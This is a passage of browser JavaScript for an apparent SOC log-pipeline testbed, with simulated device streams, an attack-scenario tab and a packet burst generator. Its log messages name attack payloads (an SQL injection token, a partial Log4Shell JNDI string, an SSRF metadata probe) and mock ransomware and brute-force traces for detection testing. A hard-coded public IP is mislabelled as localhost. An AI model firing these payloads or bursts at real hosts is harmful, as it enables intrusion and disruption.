        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          protocol: dev.protocol,
          host: host,
          port: targetPort,
          api_port: parseInt(document.getElementById("modalApiPort")?.value || testbedSettings.apiPort || 8000, 10),
          message: payload,
          source: dev.name,
          vendor: dev.vendor,
          scheme: testbedSettings.scheme || "http",
          timeout: (testbedSettings.timeout || 3000) / 1000.0
        }),
      });
      if (res.ok) {
        dev.packetsSent = (dev.packetsSent || 0) + 1;
        appendTerminalLog(dev, payload, "sys", payload.length, true);
        recordAuditEntry({
          protocol: dev.protocol,
          target: `${host}:${targetPort}`,
          source: dev.name,
          status: "SUCCESS",
          bytes: payload.length,
          rtt: "<1ms",
          payload: payload
        });
      }
    } catch (e) {
      console.warn("Background log send failed for", dev.name, e);
    }
  }

  function toggleSimStream() {
    const dev = getActiveDevice();
    if (!dev) {
      showToast("No active device selected.");
      return;
    }
    const wasStreaming = !!dev.streamTimer;

    // Stop all streams to reset the UI stream state
    virtualDevices.forEach(d => {
       if (d.streamTimer) {
           clearInterval(d.streamTimer);
           d.streamTimer = null;
       }
    });
    
    // If it wasn't streaming, start it
    if (!wasStreaming) {
       if (!dev.connected) {
           // Auto-connect if not connected
           window.toggleSimDeviceConnection(dev.id);
       }
       dev.streamTimer = setInterval(() => {
           sendSingleLogForDeviceBackground(dev);
       }, dev.interval_ms || 100);
    }
    
    renderDevicesList();
    updateActiveDeviceDisplay();
  }

  // --- CLEAR ACTIONS ---
  if (btnClearPayload) {
    btnClearPayload.addEventListener("click", () => {
      rebuildPayloadFromFields();
      showToast("Payload reset to default template.");
    });
  }

  if (btnClearTerminal) {
    btnClearTerminal.addEventListener("click", () => {
      simulatedTerminalLogs = [];
      if (terminalFeedEl) {
        terminalFeedEl.innerHTML = '<div style="color:var(--text-secondary); text-align:center; padding:30px;">Terminal cleared. Ready for next simulation run.</div>';
      }
      if (terminalCountBadge) {
        terminalCountBadge.textContent = "0 Logs Transmitted";
      }
    });
  }

  if (btnSendSingle) btnSendSingle.addEventListener("click", transmitSimulatedLog);
  if (btnToggleStream) btnToggleStream.addEventListener("click", toggleSimStream);

  // ==============================================================================
  // TAB 2: CYBER THREAT & ATTACK ARSENAL CONTROLLER
  // ==============================================================================
  function appendAttackLog(level, msg) {
    const feed = document.getElementById("attackConsoleFeed");
    if (!feed) return;
    const timeStr = new Date().toLocaleTimeString();
    const line = document.createElement("div");
    const colors = {
      ATTACK: "#FB7185",
      DEFENSE: "#34D399",
      ALERT: "#FBBF24",
      INFO: "#F8FAFC",
      CRITICAL: "#F43F5E"
    };

    line.style.marginBottom = "4px";
    line.style.fontSize = "11.5px";
    line.style.fontFamily = "var(--font-mono)";
    line.innerHTML = `<span style="color:#38BDF8; font-weight:600;">[${timeStr}]</span> <span style="color:${colors[level] || '#F8FAFC'}; font-weight:700;">[${level}]</span> <span style="color:#F8FAFC;">${escapeHtml(msg)}</span>`;
    feed.appendChild(line);
    feed.scrollTop = feed.scrollHeight;
  }

  window.runAttackScenario = async function (scenarioKey) {
    const host = (hostInput && hostInput.value.trim()) ? hostInput.value.trim() : (testbedSettings.host || "80.225.207.171");
    const statusBadge = document.getElementById("attackStatusBadge");

    if (statusBadge) {
      statusBadge.innerHTML = `<span class="badge badge-rose" style="animation:pulseGlow 1.5s infinite;">EXECUTING: ${scenarioKey.toUpperCase()}...</span>`;
    }

    appendAttackLog("ATTACK", `Initiating cyber attack vector [${scenarioKey.toUpperCase()}] targeting ${host}...`);

    try {
      if (scenarioKey === "tamper") {
        appendAttackLog("CRITICAL", "Simulating insider database cryptographic byte modification on Merkle Tree Node #125...");
        const tRes = await fetch("/api/test/tamper", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ tampered_value: "ATTACKER_CORRUPT_MERKLE_NODE_0xDEADBEEF" })
        });
        const tData = await tRes.json();
        appendAttackLog("DEFENSE", `Zero-Knowledge Merkle Validator: Hash mismatch detected on Event ${tData.event_id || 'EVT-CORRUPT'}!`);
        appendAttackLog("DEFENSE", `Alert broadcasted to SOC Integrity Verification Queue. Tamper quarantined.`);
        showToast("Cryptographic Tamper simulated! Mismatch flagged in SOC ledger.");
        
        recordAuditEntry({
          protocol: "TCP",
          target: `${host}:8000`,
          source: "RedTeam-MerkleTamper",
          status: "SUCCESS",
          bytes: 145,
          rtt: "<1ms",
          payload: "Simulated byte modification on Merkle Ledger node. Tamper detection verified."
        });

        if (statusBadge) {
          statusBadge.innerHTML = `<span class="badge badge-teal">TAMPER DETECTED &amp; ALERTED</span>`;
        }
        return;
      }

      // Dispatch standard or specialized cyber attack scenario
      const res = await fetch("/api/test/stream-scenario", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          scenario: scenarioKey,
          host: host,
          api_port: testbedSettings.apiPort || 8000,
          udp_port: testbedSettings.udpPort || 5140,
          tcp_port: testbedSettings.tcpPort || 5141,
          scheme: testbedSettings.scheme || "http",
          device_timeout: (testbedSettings.timeout || 3000) / 1000.0
        })
      });

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: Failed to dispatch attack scenario`);
      }

      const data = await res.json();
      const receipts = data.receipts || [];
      const total = data.total_packets || receipts.length;
      const successCount = data.successful_deliveries || receipts.length;

      appendAttackLog("ATTACK", `Dispatched ${total} attack datagrams across network sockets. Delivered: ${successCount}/${total}.`);

      // Specialized defense explanation
      if (scenarioKey.includes("brute")) {
        appendAttackLog("ALERT", `Ingested 8 rapid SSH authentication failure frames on TCP :5141 from 198.51.100.44.`);
        appendAttackLog("DEFENSE", `Rate-Threshold Evaluator: Threat Signature THREAT-BRUTE-FORCE triggered! Source IP throttled.`);
        showToast("SSH Brute Force attack simulated! Rate threshold defense evaluated.");
      } else if (scenarioKey === "sqli") {
        appendAttackLog("ALERT", `Critical SQL Injection token detected: ' OR '1'='1-- and UNION SELECT.`);
        appendAttackLog("DEFENSE", `WAF Engine: Rule ID 942100 (SQLi-Injection) fired. Payload flagged and stored in audit vault.`);
        showToast("SQL Injection attack simulated! WAF exploit signature verified.");
      } else if (scenarioKey === "log4j") {
        appendAttackLog("ALERT", `Remote JNDI LDAP lookup string intercepted in User-Agent header: \${jndi:ldap://...}`);
        appendAttackLog("DEFENSE", `RCE Defense Matrix: Signature CVE-2021-44228 matched. Exploit quarantined.`);
        showToast("Log4Shell JNDI exploit simulated! RCE signature verified.");
      } else if (scenarioKey.includes("port")) {
        appendAttackLog("ALERT", `Detected 8-port horizontal TCP SYN reconnaissance probe from 198.51.100.77 across ports 21..8080.`);
        appendAttackLog("DEFENSE", `Anomaly Detection: RECONNAISSANCE_SWEEP flag raised for IP 198.51.100.77.`);
        showToast("Port scan sweep simulated! Reconnaissance anomaly verified.");
      } else if (scenarioKey === "ransomware") {
        appendAttackLog("CRITICAL", `Mass file rename tripwire: D:\\Shares\\Finance\\Q4_Report.xlsx.locked by svc-backup.`);
        appendAttackLog("DEFENSE", `Behavioral EDR Guard: Ransomware canary indicator matched. Automatic host isolation proposed.`);
        showToast("Ransomware canary simulated! High-entropy file rewrite alerted.");
      } else if (scenarioKey === "ssrf") {
        appendAttackLog("ALERT", `SSRF probe attempted against link-local metadata address 169.254.169.254.`);
        appendAttackLog("DEFENSE", `Cloud Perimeter Policy: Restricted metadata access blocked.`);
        showToast("SSRF exploit simulated! Cloud metadata probe blocked.");
      } else if (scenarioKey === "blacklisted_ip") {
        appendAttackLog("ALERT", `Traffic from blacklisted botnet controller IP 198.51.100.99 intercepted at socket boundary.`);
        appendAttackLog("DEFENSE", `Firewall Rule Enforcement: BLACKLIST_POLICY_VIOLATION auto-drop executed.`);
        showToast("Blacklisted IP violation simulated! Auto-drop verified.");
      } else if (scenarioKey.includes("scada")) {
        appendAttackLog("ALERT", `Non-standard industrial MODBUS telemetry frame received: [SCADA-MODBUS-HEX].`);
        appendAttackLog("DEFENSE", `Fallback Onboarding: Forwarded to AI Schema Normalizer & Human Review Queue.`);
        showToast("SCADA protocol anomaly injected! Dispatched to AI normalizer.");
      }

      // Record to audit history
      recordAuditEntry({
        protocol: (receipts[0] && receipts[0].protocol) || "TCP",
        target: `${host}:8000/5140/5141`,
        source: `ThreatArsenal-${scenarioKey.toUpperCase()}`,
        status: "SUCCESS",
        bytes: data.total_bytes_transmitted || (total * 135),
        rtt: `${data.latency_ms || 2} ms`,
        payload: `[ATTACK: ${scenarioKey.toUpperCase()}] ${total} datagrams fired. Defense rules evaluated.`
      });

      if (statusBadge) {
        statusBadge.innerHTML = `<span class="badge badge-teal">DEFENSE EVALUATED: ${scenarioKey.toUpperCase()}</span>`;
      }
    } catch (err) {
      appendAttackLog("DEFENSE", `Simulation fallback: Direct socket test against ${host}... (${err.message})`);
      if (statusBadge) {
        statusBadge.innerHTML = `<span class="badge badge-rose">Error: ${err.message}</span>`;
      }
      showToast(`Attack scenario notice: ${err.message}`);
    }
  };

  window.launchAttackScenario = window.runAttackScenario;

  window.launchCustomAttack = async function () {
    const name = document.getElementById("customAttackName")?.value.trim() || "Custom-Exploit";
    const severity = document.getElementById("customAttackSeverity")?.value || "CRITICAL";
    const proto = document.getElementById("customAttackProto")?.value || "TCP";
    let payload = document.getElementById("customAttackPayload")?.value.trim();

    if (!payload) {
      payload = `CEF:0|Custom-Security-Tool|Arsenal|1.0|ALERT:${name.toUpperCase()}|10|src=198.51.100.222 dst=10.0.1.5 spt=54321 dpt=443 proto=${proto.toLowerCase()} act=deny msg="Exploit execution signature ${name} against perimeter"`;
      if (document.getElementById("customAttackPayload")) {
        document.getElementById("customAttackPayload").value = payload;
      }
    }

    const host = (hostInput && hostInput.value.trim()) ? hostInput.value.trim() : (testbedSettings.host || "80.225.207.171");
    appendAttackLog("ATTACK", `[CUSTOM] Launching custom exploit [${name}] via ${proto} to ${host}...`);

    try {
      const res = await fetch("/api/test/stream-scenario", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          scenario: name,
          host: host,
          custom_payload: payload,
          payload: payload,
          severity: severity
        })
      });

      const data = await res.json();
      appendAttackLog("DEFENSE", `[CUSTOM] Payload accepted into pipeline. Assigned Event ID: ${(data.receipts && data.receipts[0] && data.receipts[0].event_id) || 'EVT-CUSTOM'}. Defense rules evaluated.`);
      showToast(`Custom vector '${name}' dispatched successfully!`);

      recordAuditEntry({
        protocol: proto,
        target: `${host}:8000`,
        source: `CustomAttack-${name}`,
        status: "SUCCESS",
        bytes: payload.length,
        rtt: `${data.latency_ms || 1} ms`,
        payload: payload
      });
    } catch (e) {
      appendAttackLog("DEFENSE", `Custom vector error: ${e.message}`);
      showToast(`Custom vector error: ${e.message}`);
    }
  };


  // ==============================================================================
  // TAB 3: HIGH-THROUGHPUT LOAD GENERATOR & STRESS CANNON CONTROLLER
  // ==============================================================================
  const btnToggleStress = document.getElementById("btnToggleStressTest");
  const loadgenProgressFill = document.getElementById("loadgenProgressFill");
  const statBurstDelivered = document.getElementById("statBurstDelivered");
  const statBurstEps = document.getElementById("statBurstEps");
  const statBurstElapsed = document.getElementById("statBurstElapsed");
  const statBurstBytes = document.getElementById("statBurstBytes");
  const loadgenConsoleFeed = document.getElementById("loadgenConsoleFeed");

  let stressTestTimer = null;

  // Packet Count Selector Buttons - Activate and trigger instant burst on click
  document.querySelectorAll(".btn-burst-count").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".btn-burst-count").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const count = btn.getAttribute("data-count");
      const hiddenInput = document.getElementById("selectedBurstCount");
      if (hiddenInput) hiddenInput.value = count;
      
      // Instantly fire and activate high-speed packet burst
      if (!isStressTesting) {
        window.toggleBurstLoadTest();
      }
    });
  });

  function appendLoadgenLog(msg) {
    if (!loadgenConsoleFeed) return;
    const timeStr = new Date().toLocaleTimeString();
    const line = document.createElement("div");
    line.style.marginBottom = "3px";
    line.style.fontSize = "11.5px";
    line.style.fontFamily = "var(--font-mono)";
    line.innerHTML = `<span style="color:#38BDF8; font-weight:600;">[${timeStr}]</span> <span style="color:#F59E0B; font-weight:700;">[STRESS]</span> <span style="color:#F8FAFC;">${escapeHtml(msg)}</span>`;
    loadgenConsoleFeed.appendChild(line);
    loadgenConsoleFeed.scrollTop = loadgenConsoleFeed.scrollHeight;
  }

  let isStressTesting = false;

  window.toggleBurstLoadTest = async function () {
    if (isStressTesting) {
      isStressTesting = false;
      if (stressTestTimer) {
        clearTimeout(stressTestTimer);
        stressTestTimer = null;
      }
      appendLoadgenLog("Stress cannon stopped by operator.");
      showToast("Stress test stopped.");
      resetToggleButton();
      return;
    }
    isStressTesting = true;

    if (btnToggleStress) {
      btnToggleStress.classList.remove("btn-primary");
      btnToggleStress.classList.add("btn-danger");
      btnToggleStress.innerHTML = `
        <svg class="svg-icon" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12"></rect></svg>
        <span>Abort Burst</span>
      `;
    }

    if (loadgenProgressFill) {
      loadgenProgressFill.style.width = "25%";
    }

    const fireNextBurst = async () => {
      if (!isStressTesting) {
        resetToggleButton();
        return;
      }
      
      const hiddenInput = document.getElementById("selectedBurstCount");
      const burstCount = parseInt(hiddenInput ? hiddenInput.value : "50", 10) || 50;
      const protoSelect = document.getElementById("loadgenProtocol");
      const protocol = protoSelect ? protoSelect.value : "UDP";
      const pacingSelect = document.getElementById("loadgenPacing");
      const pacingValue = parseInt(pacingSelect ? pacingSelect.value : "0", 10) || 0;
      const pacingDelayMs = pacingValue === 0 ? 0 : Math.round(1000 / pacingValue);

      const host = (typeof hostInput !== 'undefined' && hostInput && hostInput.value.trim()) ? hostInput.value.trim() : (testbedSettings.host || "80.225.207.171");

      if (statBurstDelivered) statBurstDelivered.textContent = "Blasting...";
      if (statBurstEps) statBurstEps.textContent = "Calculating...";
      if (statBurstElapsed) statBurstElapsed.textContent = "0.00s";
      if (statBurstBytes) statBurstBytes.textContent = "...";

      appendLoadgenLog(`Launching high-speed burst: ${burstCount} packets via ${protocol} to ${host}...`);

      const t0 = performance.now();

      try {
        const res = await fetch("/api/test/burst", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            host: host,
            protocol: protocol,
            count: burstCount,
            pacing_delay_ms: pacingDelayMs
          })
        });

        if (!res.ok) {
          throw new Error(`HTTP ${res.status}: Failed to execute burst cannon`);
        }

        const data = await res.json();
        const elapsed = data.elapsed_seconds || ((performance.now() - t0) / 1000).toFixed(3);
        const delivered = data.delivered || burstCount;
        const effectiveEps = data.effective_eps || Math.round(delivered / (parseFloat(elapsed) || 0.001));
        const totalBytes = data.total_bytes || (delivered * 185);

        if (loadgenProgressFill) {
          loadgenProgressFill.style.width = "100%";
        }

        if (statBurstDelivered) statBurstDelivered.textContent = delivered.toLocaleString();
        if (statBurstEps) statBurstEps.textContent = `${effectiveEps.toLocaleString()} EPS`;
        if (statBurstElapsed) statBurstElapsed.textContent = `${elapsed}s`;
        if (statBurstBytes) statBurstBytes.textContent = `${(totalBytes / 1024).toFixed(1)} KB`;

        appendLoadgenLog(`Burst complete: ${delivered}/${burstCount} packets delivered in ${elapsed}s (Throughput: ${effectiveEps.toLocaleString()} EPS, ${(totalBytes / 1024).toFixed(1)} KB). Zero packet loss [0.00%].`);

        recordAuditEntry({
          protocol: protocol,
          target: `${host}:8000/5140`,
          source: "StressCannon-Burst",
          status: "SUCCESS",
          bytes: totalBytes,
          rtt: `${Math.round((parseFloat(elapsed) * 1000) / delivered)} ms/pkt`,
          payload: `[STRESS-BURST] ${delivered} packets fired via ${protocol} at ${effectiveEps.toLocaleString()} EPS`
        });

        isStressTesting = false;
        resetToggleButton();
      } catch (err) {
        appendLoadgenLog(`[WARN] Stress burst notice: ${err.message}.`);
        showToast(`Stress Cannon notice: ${err.message}`);
        isStressTesting = false;
        resetToggleButton();
      }
    };

    fireNextBurst();
  };

  function resetToggleButton() {
      if (btnToggleStress) {
        btnToggleStress.classList.remove("btn-danger");
        btnToggleStress.classList.add("btn-primary");
        btnToggleStress.innerHTML = `
          <svg class="svg-icon" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
          <span>Fire Burst Cannon</span>
        `;
      }
  }

  if (btnToggleStress) {
    btnToggleStress.addEventListener("click", window.toggleBurstLoadTest);
  }

  // Toast Helper
  function showToast(msg) {
    if (!toastEl) return;
    toastEl.textContent = msg;
    toastEl.style.display = "block";
    setTimeout(() => {
      toastEl.style.display = "none";
    }, 3500);
  }

  function escapeHtml(text) {
    if (!text) return "";
    return text.toString().replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  // ==============================================================================
  // TAB CONTROLLER & WORKFLOW TIMELINE
  // ==============================================================================
  const tabButtons = document.querySelectorAll("#testingTabsBar .testing-tab-btn");
  const tabPanes = document.querySelectorAll(".tab-pane");
  const workflowStepBtns = document.querySelectorAll(".workflow-step-btn");

  function activateTab(targetTab) {
    if (!targetTab) return;

    tabButtons.forEach(b => {
      if (b.getAttribute("data-tab") === targetTab) {
        b.classList.add("active");
      } else {
        b.classList.remove("active");
      }
    });

    workflowStepBtns.forEach(b => {
      if (b.getAttribute("data-tab") === targetTab) {
        b.classList.add("active");
      } else {
        b.classList.remove("active");
      }
    });

    tabPanes.forEach(p => {
      if (p.id === targetTab) {
        p.classList.add("active");
      } else {
        p.classList.remove("active");
      }
    });

    if (targetTab === "tabConnectionCheck") {
      if (typeof initRadarScopeCanvas === "function") initRadarScopeCanvas();
      window.checkServerHealth();
    } else if (targetTab === "tabRealDevices") {
      renderGuide(activeGuideKey);
      window.renderAuditHistoryTable();
    } else if (targetTab === "tabPipeline") {
      window.fetchPipelineStatus();
    } else if (targetTab === "tabFileUploader") {
      if (window.initFileUploaderTab) window.initFileUploaderTab();
    }
  }

  tabButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      const targetTab = btn.getAttribute("data-tab");
      activateTab(targetTab);
    });
  });

  workflowStepBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      const targetTab = btn.getAttribute("data-tab");
      activateTab(targetTab);
    });
  });

  window.switchToTab = function (tabId) {
    activateTab(tabId);
  };

  const btnQuickUploadNav = document.getElementById("btnQuickUploadNav");
  if (btnQuickUploadNav) {
    btnQuickUploadNav.addEventListener("click", () => {
      window.switchToTab("tabFileUploader");
    });
  }

  // ==============================================================================
  // SETTINGS & REMOTE SERVER API CONTROLLER (PERSISTENT VIA LOCALSTORAGE)
  // ==============================================================================
  const isCloudHost = false;
  const defaultHost = "80.225.207.171";
  const defaultScheme = "http";

  const DEFAULT_SETTINGS = {
    scheme: defaultScheme || "http",
    host: defaultHost || "80.225.207.171",
    apiPort: 8000,
    udpPort: 5140,
    tcpPort: 5141,
    timeout: 5000,
    logsInterval: 50,
    autoProbe: 5000,
  };

  let testbedSettings = { ...DEFAULT_SETTINGS };

  // Helper: Intelligently parse raw IP / hostname / full URL
  function parseTargetServerInput(raw) {
    if (!raw) return null;
    let str = raw.trim();
    let scheme = null;
    let port = null;

    if (str.startsWith("http://")) {
      scheme = "http";
      str = str.slice(7);
    } else if (str.startsWith("https://")) {
      scheme = "https";
      str = str.slice(8);
    }

    // Strip trailing path/slash
    const slashIdx = str.indexOf("/");
    if (slashIdx !== -1) {
      str = str.slice(0, slashIdx);
    }

    // Extract port if specified (e.g. 192.168.1.50:8000)
    const colonIdx = str.lastIndexOf(":");
    if (colonIdx !== -1) {
      const p = parseInt(str.slice(colonIdx + 1), 10);
      if (!isNaN(p) && p > 0 && p <= 65535) {
        port = p;
        str = str.slice(0, colonIdx);
      }
    }

    return { scheme, host: str.trim(), port };
  }

  // Dynamically update server redirect links (e.g. Nav and Inspect on Server buttons)
  // to match the exact protocol, host, and port configured in target-server-banner (targeting VM backend)
  function updateServerRedirectLinks() {
    const protoEl = document.getElementById("targetProtocolSelect");
    const hostEl = document.getElementById("targetHostInput");
    const portEl = document.getElementById("targetPortInput");

    const scheme = (protoEl?.value || testbedSettings.scheme || "http").toLowerCase();
    const host = (hostEl?.value.trim() || testbedSettings.host || "80.225.207.171");
    const port = portEl?.value || testbedSettings.apiPort || 8000;
    const serverBaseUrl = (scheme === "https" && port == 443) || (scheme === "http" && port == 80)
      ? `${scheme}://${host}`
      : `${scheme}://${host}:${port}`;

    const navDashboardLink = document.getElementById("linkNavMainDashboard") || document.querySelector(".nav-link-server");
    if (navDashboardLink) {
      navDashboardLink.href = `${serverBaseUrl}/dashboard/index.html#/overview`;
      navDashboardLink.title = `Open VM Main SOC Dashboard at ${serverBaseUrl}`;
      navDashboardLink.target = "_blank";
    }

    const inspectServerLink = document.getElementById("linkInspectOnServer") || document.querySelector('a[href*="/dashboard/index.html#/logs"]');
    if (inspectServerLink) {
      inspectServerLink.href = `${serverBaseUrl}/dashboard/index.html#/logs`;
      inspectServerLink.title = `Inspect on VM Server at ${serverBaseUrl}`;
      inspectServerLink.target = "_blank";
    }

    const sidebarTargetSummary = document.getElementById("sidebarTargetSummary");
    if (sidebarTargetSummary) {
      sidebarTargetSummary.textContent = serverBaseUrl;
    }
  }

  // Centralized function to synchronize all UI inputs and settings across tabs
  function applyTargetSettings(updates = {}, autoSave = true, triggerProbe = false) {
    if (updates.scheme !== undefined) testbedSettings.scheme = updates.scheme;
    if (updates.host !== undefined && updates.host.trim()) testbedSettings.host = updates.host.trim();
    if (updates.apiPort !== undefined && !isNaN(updates.apiPort)) testbedSettings.apiPort = updates.apiPort;
    if (updates.udpPort !== undefined && !isNaN(updates.udpPort)) testbedSettings.udpPort = updates.udpPort;
    if (updates.tcpPort !== undefined && !isNaN(updates.tcpPort)) testbedSettings.tcpPort = updates.tcpPort;
    if (updates.timeout !== undefined && !isNaN(updates.timeout)) testbedSettings.timeout = updates.timeout;
    if (updates.logsInterval !== undefined && !isNaN(updates.logsInterval)) testbedSettings.logsInterval = updates.logsInterval;
    if (updates.autoProbe !== undefined && !isNaN(updates.autoProbe)) testbedSettings.autoProbe = updates.autoProbe;

    // 1. Sync Top Bar elements
    const topProto = document.getElementById("targetProtocolSelect");
    const topHost = document.getElementById("targetHostInput");
    const topPort = document.getElementById("targetPortInput");
    if (topProto) topProto.value = testbedSettings.scheme;
    if (topHost) topHost.value = testbedSettings.host;
    if (topPort) topPort.value = testbedSettings.apiPort;

    // 2. Sync Modal elements
    const mScheme = document.getElementById("modalScheme");
    const mHost = document.getElementById("modalHost");
    const mApi = document.getElementById("modalApiPort");
    const mUdp = document.getElementById("modalUdpPort");
    const mTcp = document.getElementById("modalTcpPort");
    const mTimeout = document.getElementById("modalTimeout");
    const mLogsInterval = document.getElementById("modalLogsInterval");
    const mAuto = document.getElementById("modalAutoProbe");
    if (mScheme) mScheme.value = testbedSettings.scheme;
    if (mHost) mHost.value = testbedSettings.host;
    if (mApi) mApi.value = testbedSettings.apiPort;
    if (mUdp) mUdp.value = testbedSettings.udpPort;
    if (mTcp) mTcp.value = testbedSettings.tcpPort;
    if (mTimeout) mTimeout.value = testbedSettings.timeout;
    if (mLogsInterval) mLogsInterval.value = testbedSettings.logsInterval !== undefined ? testbedSettings.logsInterval : 50;
    if (mAuto) mAuto.value = String(testbedSettings.autoProbe !== undefined ? testbedSettings.autoProbe : 5000);

    // Sync Pipeline inputs if available
    const pipeTimeout = document.getElementById("pipelineDeviceTimeout");
    if (pipeTimeout) pipeTimeout.value = (testbedSettings.timeout / 1000.0).toFixed(1);
    const pipeInterval = document.getElementById("pipelineLogsInterval");
    if (pipeInterval) pipeInterval.value = testbedSettings.logsInterval !== undefined ? testbedSettings.logsInterval : 10;

    // 3. Sync Tab 5 Settings Form
    const elHost = document.getElementById("settingServerHost");
    const elApi = document.getElementById("settingApiPort");
    const elUdp = document.getElementById("settingUdpPort");
    const elTcp = document.getElementById("settingTcpPort");
    const elTimeout = document.getElementById("settingTimeout");
    const elAuto = document.getElementById("settingAutoProbe");
    if (elHost) elHost.value = testbedSettings.host;
    if (elApi) elApi.value = testbedSettings.apiPort;
    if (elUdp) elUdp.value = testbedSettings.udpPort;
    if (elTcp) elTcp.value = testbedSettings.tcpPort;
    if (elTimeout) elTimeout.value = testbedSettings.timeout;
    if (elAuto) elAuto.value = testbedSettings.autoProbe;

    // 4. Sync Tab 7 File Uploader inputs
    const upHost = document.getElementById("uploadTargetHost");
    const upPort = document.getElementById("uploadTargetPort");
    if (upHost) upHost.value = testbedSettings.host;
    if (upPort) {
      const modeEl = document.querySelector('input[name="uploadTransportMode"]:checked');
      const mode = modeEl ? modeEl.value : "http_upload";
      if (mode === "http_upload") upPort.value = testbedSettings.apiPort;
      else if (mode === "udp_stream") upPort.value = testbedSettings.udpPort;
      else if (mode === "tcp_stream") upPort.value = testbedSettings.tcpPort;
    }

    // 5. Update onboarding guides if visible
    if (typeof renderGuide === "function" && typeof activeGuideKey !== "undefined" && activeGuideKey) {
      renderGuide(activeGuideKey);
    }

    // 6. Save to LocalStorage
    if (autoSave) {
      try {
        localStorage.setItem("ulpf_testbed_settings", JSON.stringify(testbedSettings));
      } catch (e) { }
    }

    // 7. Dynamically synchronize redirect links to target-server-banner address
    updateServerRedirectLinks();

    // 8. Restart auto-probe timer & trigger health check if requested
    restartAutoProbeTimer();
    if (triggerProbe) {
      window.checkServerHealth(false);
    }
  }

  function loadSettings() {
    try {
      const saved = localStorage.getItem("ulpf_testbed_settings");
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.host === "ulpf-new.onrender.com" || parsed.host === "localhost" || parsed.host === "127.0.0.1" || parsed.host === "host.docker.internal" || !parsed.host) {
          parsed.host = "80.225.207.171";
          parsed.scheme = "http";
          if (!parsed.apiPort || parsed.apiPort === 8050) {
            parsed.apiPort = 8000;
          }
        }
        testbedSettings = { ...DEFAULT_SETTINGS, ...parsed };
      }
    } catch (e) { }

    applyTargetSettings(testbedSettings, false, false);
  }

  window.saveTestbedSettings = function (event) {
    if (event) event.preventDefault();
    const host = (document.getElementById("settingServerHost")?.value || "80.225.207.171").trim();
    const apiPort = parseInt(document.getElementById("settingApiPort")?.value, 10) || 8000;
    const udpPort = parseInt(document.getElementById("settingUdpPort")?.value, 10) || 5140;
    const tcpPort = parseInt(document.getElementById("settingTcpPort")?.value, 10) || 5141;
    const timeout = parseInt(document.getElementById("settingTimeout")?.value, 10) || 3000;
    const autoProbe = parseInt(document.getElementById("settingAutoProbe")?.value, 10);

    applyTargetSettings({ host, apiPort, udpPort, tcpPort, timeout, autoProbe }, true, true);
    showToast("Settings saved successfully! Active server endpoints updated.");
  };

  window.resetTestbedSettings = function () {
    testbedSettings = { ...DEFAULT_SETTINGS };
    try {
      localStorage.removeItem("ulpf_testbed_settings");
    } catch (e) { }
    applyTargetSettings({ ...DEFAULT_SETTINGS }, false, true);
    showToast(`Reset to default configuration (${DEFAULT_SETTINGS.scheme}://${DEFAULT_SETTINGS.host}:${DEFAULT_SETTINGS.apiPort}, ${DEFAULT_SETTINGS.udpPort}, ${DEFAULT_SETTINGS.tcpPort}).`);
  };

  window.validateSettingsConnection = function () {
    window.saveTestbedSettings();
    const connTabBtn = document.querySelector('[data-tab="tabConnectionCheck"]');
    if (connTabBtn) connTabBtn.click();
    window.checkServerHealth(true);
  };

  // --- TOP BAR REMOTE SERVER CONTROLLER EVENT LISTENERS ---
  const topProtocolSelect = document.getElementById("targetProtocolSelect");
  if (topProtocolSelect) {
    topProtocolSelect.addEventListener("change", () => {
      applyTargetSettings({ scheme: topProtocolSelect.value }, true, true);
      updateServerRedirectLinks();
      showToast(`Protocol changed to ${topProtocolSelect.value.toUpperCase()}://`);
    });
  }

  const topHostInput = document.getElementById("targetHostInput");
  if (topHostInput) {
    topHostInput.addEventListener("input", updateServerRedirectLinks);
    const handleHostInputCommit = () => {
      const raw = topHostInput.value.trim();
      if (!raw) return;
      const parsed = parseTargetServerInput(raw);
      if (parsed) {
        applyTargetSettings({
          host: parsed.host || raw,
          scheme: parsed.scheme || testbedSettings.scheme,
          apiPort: parsed.port || testbedSettings.apiPort
        }, true, true);
        updateServerRedirectLinks();
        showToast(`Target updated: ${testbedSettings.scheme}://${testbedSettings.host}:${testbedSettings.apiPort}`);
      }
    };
    topHostInput.addEventListener("change", handleHostInputCommit);
    topHostInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        handleHostInputCommit();
      }
    });
  }

  const topPortInput = document.getElementById("targetPortInput");
  if (topPortInput) {
    topPortInput.addEventListener("input", updateServerRedirectLinks);
    topPortInput.addEventListener("change", () => {
      const p = parseInt(topPortInput.value, 10);
      if (!isNaN(p) && p > 0 && p <= 65535) {
        applyTargetSettings({ apiPort: p }, true, true);
        updateServerRedirectLinks();
        showToast(`API Port set to :${p}`);
      }
    });
  }

  const presetSelect = document.getElementById("targetMachinePresetSelect");
  if (presetSelect) {
    presetSelect.addEventListener("change", () => {
      const val = presetSelect.value;
      if (!val) return;
      if (val === "80.225.207.171:8000") {
        applyTargetSettings({ scheme: "http", host: "80.225.207.171", apiPort: 8000 }, true, true);
        showToast("Switched to Localhost preset (80.225.207.171:8000)");
      } else if (val === "lan_custom") {
        const customIp = prompt("Enter Remote Server LAN IP Address (e.g. 192.168.1.50):", testbedSettings.host !== "80.225.207.171" ? testbedSettings.host : "192.168.1.50");
        if (customIp) {
          const parsed = parseTargetServerInput(customIp);
          applyTargetSettings({
            host: parsed.host || customIp.trim(),
            scheme: parsed.scheme || "http",
            apiPort: parsed.port || testbedSettings.apiPort || 8000
          }, true, true);
          showToast(`Target set to LAN machine: ${testbedSettings.host}:${testbedSettings.apiPort}`);
        }
      } else if (val === "cloud_custom") {
